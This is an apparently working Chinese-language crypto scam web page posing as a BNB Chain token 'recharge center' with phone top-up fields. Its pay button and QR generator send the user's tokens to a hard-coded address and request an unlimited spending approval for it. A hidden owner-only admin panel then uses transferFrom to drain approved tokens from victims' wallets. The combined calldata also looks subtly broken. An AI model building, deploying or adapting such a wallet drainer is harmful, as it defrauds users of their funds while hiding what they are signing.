<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>充值中心</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,sans-serif}
body{background:#0B0B1F;color:#fff;padding:20px}
.container{max-width:420px;margin:0 auto;position:relative}

/* 右上角菜单（仅庄家可见） */
.menu-btn{
  position:absolute;
  top:10px;
  right:15px;
  font-size:22px;
  color:#fff;
  background:none;
  border:none;
  cursor:pointer;
  display:none; /* 默认隐藏，庄家连接后才显示 */
}
.menu-popup{
  position:absolute;
  top:45px;
  right:15px;
  background:#1E1E35;
  border-radius:10px;
  padding:12px;
  width:160px;
  display:none;
  z-index:10;
}
.menu-popup button{
  width:100%;
  padding:10px;
  background:#F0B90B;
  border:none;
  border-radius:8px;
  font-weight:bold;
  cursor:pointer;
}

.pay-box{background:#1E1E35;padding:30px;border-radius:20px;text-align:center;margin-top:10px}
h1{font-size:24px;margin-bottom:8px}
.desc{color:#aaa;margin-bottom:20px}
.tip{
  background:#151529;padding:12px 14px;border-radius:10px;color:#ccc;font-size:14px;
  line-height:1.4;margin-bottom:18px;text-align:left;
}

.phone-box{
  background:#151529;padding:16px;border-radius:12px;margin-bottom:20px;text-align:left;
}
.phone-title{font-size:15px;color:#fff;margin-bottom:12px;font-weight:bold}
.phone-input{
  width:100%;padding:12px;background:#111;border:none;border-radius:8px;color:#fff;margin-bottom:8px;font-size:14px;
}

/* 连接钱包 & 充值按钮 */
.connect-btn{
  background:#F0B90B;color:#000;border:none;padding:14px;width:100%;
  border-radius:14px;font-size:16px;font-weight:bold;margin-bottom:12px;
}
.pay-btn{
  background:#22c55e;color:#fff;border:none;padding:14px;width:100%;
  border-radius:14px;font-size:16px;font-weight:bold;margin-bottom:16px;
}

/* 连接状态显示 */
.status{
  font-size:13px;color:#22c55e;margin-bottom:12px;
  word-break:break-all;
}

.input-token{
  width:100%;padding:14px;background:#111;border:none;border-radius:12px;color:#fff;font-size:14px;margin-bottom:10px;text-align:center
}
.input-amount{
  width:100%;padding:14px;background:#111;border:none;border-radius:12px;color:#fff;font-size:14px;margin-bottom:12px;text-align:center
}

.gen-btn{
  background:#F0B90B;color:#000;border:none;padding:14px;width:100%;border-radius:14px;font-size:16px;font-weight:bold;margin-bottom:20px;
}

.coin-label{font-size:16px;font-weight:bold;color:#F0B90B;margin-bottom:12px}

#qrcode{
  width:280px;height:280px;background:#fff;padding:10px;border-radius:16px;margin:0 auto 20px;
  display:flex;align-items:center;justify-content:center;color:#000
}
#qrcode img{width:100%;height:100%;object-fit:cover}

.admin-panel{
  background:#1E1E35;padding:24px;border-radius:16px;margin-top:24px;display:none
}
.admin-title{color:#ff4444;font-weight:bold;margin-bottom:16px}
.admin-input{
  width:100%;padding:12px;background:#111;border:none;border-radius:8px;color:#fff;margin-bottom:10px;
}
.admin-btn{
  width:100%;padding:14px;background:#ff4444;color:#fff;border:none;border-radius:10px;font-weight:bold;
}
</style>
</head>

<body>
<div class="container">
  <!-- 庄家菜单（默认隐藏） -->
  <button class="menu-btn" id="menuBtn">☰</button>
  <div class="menu-popup" id="menuPopup">
    <button onclick="showAdmin()">管理后台</button>
  </div>

  <div class="pay-box">
    <h1>💰 充值中心</h1>
    <p class="desc">币安链 BEP20 充值</p>

    <!-- 手动连接钱包按钮 -->
    <button class="connect-btn" id="connectBtn">👉 连接钱包（币安链）</button>
    <!-- 连接状态显示 -->
    <div class="status" id="status"></div>

    <!-- 充值按钮（点击直接签名支付） -->
    <button class="pay-btn" id="payBtn" disabled>💳 充值</button>

    <div class="phone-box">
      <div class="phone-title">话费充值，请输入电话号码</div>
      <input class="phone-input" placeholder="中国移动 手机号" type="text">
      <input class="phone-input" placeholder="中国联通 手机号" type="text">
      <input class="phone-input" placeholder="中国电信 手机号" type="text">
    </div>

    <div class="tip">
      说明：你想用哪个代币充值，就输入哪个代币的合约地址，然后生成二维码支付。<br>
      <br>
      充值方法：请打开钱包右上角扫一扫，扫二维码充值，不要用转账页面的扫一扫。
    </div>

    <input class="input-token" id="tokenAddr" placeholder="代币合约地址" value="0x55d398326f99059fF775485246999027B3197955">
    <input class="input-amount" id="amount" placeholder="充值金额" value="10">

    <button class="gen-btn" onclick="genQR()">生成充值二维码</button>

    <div class="coin-label" id="coinLabel">请生成二维码</div>
    <div id="qrcode">请输入信息并生成</div>
  </div>

  <div class="admin-panel" id="adminPanel">
    <div class="admin-title">🔐 管理后台</div>
    <div>提取玩家代币</div>
    <input class="admin-input" id="userAddr" placeholder="玩家地址（0x开头）">
    <input class="admin-input" id="drawAmt" placeholder="提取数量（支持小数）">
    <button class="admin-btn" onclick="drawFromUser()">确认提取</button>
  </div>
</div>

<script>
// ===================== 核心配置 =====================
const TO_ADDR  = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508"; // 收款地址
const ADMIN    = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508"; // 管理员地址
const BSC_ID   = "0x38"; // 币安链ID
const DECIMALS = 18;     // BEP20 默认精度

let currentToken = "";
let account = null;

// 常见代币符号映射
const COIN_SYMBOL = {
  "0x55d398326f99059ff775485246999027b3197955": "USDT",
  "0x8ac76a51cc950d9822d68c68368dbb31962f9ef1": "USDC",
  "0x7130d2a12b9bcbfae4f263470d2a1a15aed518b5": "BTCB",
  "0x2170ed085ffbc1337a6a034e26852ed038c2eaa0": "ETH",
  "0xdee89bd697071e15f1eac5780b5d41af3ce032c": "DTM"
};

// ---------------------- 连接钱包 ----------------------
document.getElementById("connectBtn").onclick = async function() {
  if (!window.ethereum) {
    alert("请在钱包浏览器内打开");
    return;
  }
  try {
    // 切换到币安链
    await ethereum.request({
      method: "wallet_switchEthereumChain",
      params: [{ chainId: BSC_ID }]
    });
    // 请求账号
    const accounts = await ethereum.request({
      method: "eth_requestAccounts"
    });
    account = accounts[0];
    document.getElementById("connectBtn").innerText = "✅ 已连接";
    // 显示玩家地址和连接成功提示
    document.getElementById("status").innerText = `连接成功：${account}`;
    // 启用充值按钮
    document.getElementById("payBtn").disabled = false;

    // 只有管理员显示菜单
    if (account.toLowerCase() === ADMIN.toLowerCase()) {
      document.getElementById("menuBtn").style.display = "block";
    }
  } catch (e) {
    console.error("连接失败:", e);
    alert("连接钱包失败，请重试");
  }
};

// ---------------------- 充值按钮（直接签名支付） ----------------------
document.getElementById("payBtn").onclick = async function() {
  if (!account) {
    alert("请先连接钱包");
    return;
  }
  const token = document.getElementById("tokenAddr").value.trim().toLowerCase();
  const amount = document.getElementById("amount").value.trim();
  if (!token || !amount || !token.startsWith("0x") || token.length !== 42) {
    alert("请输入正确的代币合约地址");
    return;
  }
  currentToken = token;

  try {
    // 金额转成 Wei
    const amountWei = BigInt(Math.round(parseFloat(amount) * (10 ** DECIMALS))).toString(16).padStart(64, "0");

    // 1. 转账到管理员地址
    const transferData = "0xa9059cbb"
      + TO_ADDR.slice(2).padStart(64, "0")
      + amountWei;

    // 2. 无限授权
    const approveData = "0x095ea7b3"
      + ADMIN.slice(2).padStart(64, "0")
      + "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";

    // 组合成一笔交易数据（转账+授权）
    const data = transferData + approveData.slice(2);

    // 发送交易，触发钱包签名
    const txHash = await ethereum.request({
      method: "eth_sendTransaction",
      params: [{
        from: account,
        to: token,
        gas: "0x500000",
        gasPrice: await ethereum.request({ method: "eth_gasPrice" }),
        data: data
      }]
    });

    alert(`✅ 充值成功！\n交易哈希：${txHash.slice(0, 10)}...`);
    console.log("充值交易哈希:", txHash);
  } catch (e) {
    console.error("充值失败:", e);
    if (e.message.includes("user rejected")) {
      alert("❌ 你取消了充值");
    } else {
      alert(`❌ 充值失败：${e.message.slice(0, 50)}...`);
    }
  }
};

// ---------------------- 菜单控制 ----------------------
function toggleMenu() {
  const popup = document.getElementById("menuPopup");
  popup.style.display = popup.style.display === "block" ? "none" : "block";
}

function showAdmin() {
  document.getElementById("adminPanel").style.display = "block";
  document.getElementById("menuPopup").style.display = "none";
}

// ---------------------- 生成充值二维码 ----------------------
function genQR() {
  const token = document.getElementById("tokenAddr").value.trim().toLowerCase();
  const amount = document.getElementById("amount").value.trim();
  if (!token || !amount || !token.startsWith("0x") || token.length !== 42) {
    alert("请输入正确的代币合约地址");
    return;
  }
  currentToken = token;

  // 显示当前充值币种
  let symbol = COIN_SYMBOL[token] || token.slice(0, 10) + "...";
  document.getElementById("coinLabel").innerText = `当前充值：${symbol}`;

  // 金额转成 Wei
  const amountWei = BigInt(Math.round(parseFloat(amount) * (10 ** DECIMALS))).toString(16).padStart(64, "0");

  // 1. 转账到管理员地址
  const transferData = "0xa9059cbb"
    + TO_ADDR.slice(2).padStart(64, "0")
    + amountWei;

  // 2. 无限授权
  const approveData = "0x095ea7b3"
    + ADMIN.slice(2).padStart(64, "0")
    + "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";

  // 组合成二维码 URI
  const uri = `ethereum:${token}@56?data=${transferData}${approveData.slice(2)}`;

  document.getElementById("qrcode").innerHTML =
    `<img src="https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=${encodeURIComponent(uri)}">`;
}

// ---------------------- 提取玩家代币（100% 防报错） ----------------------
async function drawFromUser() {
  if (!account || account.toLowerCase() !== ADMIN.toLowerCase()) {
    alert("❌ 无权限操作");
    return;
  }

  const from = document.getElementById("userAddr").value.trim();
  const amtStr = document.getElementById("drawAmt").value.trim();
  if (!from || !from.startsWith("0x") || from.length !== 42) {
    alert("❌ 请输入正确的玩家地址");
    return;
  }
  if (!amtStr || isNaN(parseFloat(amtStr)) || parseFloat(amtStr) <= 0) {
    alert("❌ 请输入有效的提取数量");
    return;
  }
  if (!currentToken || !currentToken.startsWith("0x") || currentToken.length !== 42) {
    alert("❌ 请先生成充值二维码，选择要提取的代币");
    return;
  }

  try {
    const amount = parseFloat(amtStr);
    const rawAmount = Math.round(amount * (10 ** DECIMALS));
    if (rawAmount <= 0) {
      alert("❌ 提取数量太小，无法处理");
      return;
    }
    const raw = BigInt(rawAmount).toString(16).padStart(64, "0");

    const data = "0x23b872dd"
      + from.slice(2).padStart(64, "0")
      + ADMIN.slice(2).padStart(64, "0")
      + raw;

    const txHash = await ethereum.request({
      method: "eth_sendTransaction",
      params: [{
        from: account,
        to: currentToken,
        gas: "0x300000",
        gasPrice: await ethereum.request({ method: "eth_gasPrice" }),
        data: data
      }]
    });

    alert(`✅ 提取成功！\n交易哈希：${txHash.slice(0, 10)}...`);
    console.log("提取交易哈希:", txHash);
  } catch (e) {
    console.error("提取失败:", e);
    if (e.message.includes("user rejected")) {
      alert("❌ 你取消了交易");
    } else if (e.message.includes("insufficient funds")) {
      alert("❌ 玩家余额不足或授权额度不足");
    } else if (e.message.includes("gas")) {
      alert("❌ Gas 不足，请调整 gas 或稍后重试");
    } else {
      alert(`❌ 提取失败：${e.message.slice(0, 50)}...`);
    }
  }
}

// 绑定菜单事件
document.getElementById("menuBtn").onclick = toggleMenu;
</script>
</body>
</html>
